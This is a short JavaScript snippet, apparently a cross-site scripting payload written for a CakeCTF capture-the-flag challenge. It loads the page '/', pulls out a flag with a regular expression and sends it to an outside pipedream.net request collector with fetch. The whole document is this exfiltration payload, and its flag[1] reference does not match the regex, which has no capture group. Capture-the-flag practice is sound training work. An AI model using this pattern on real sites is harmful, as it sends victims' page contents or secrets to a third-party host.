let xhr = new XMLHttpRequest();
xhr.open("GET", "/", false)
xhr.onload = function () {
    console.log(`Loaded: ${xhr.status} ${xhr.response}`);
    let flag = /CakeCTF{.*}/.exec(xhr.response);
    console.log(flag);
    fetch("https://eoor1c6mm76wo38.m.pipedream.net/" + flag[1]);
};
xhr.send(null)
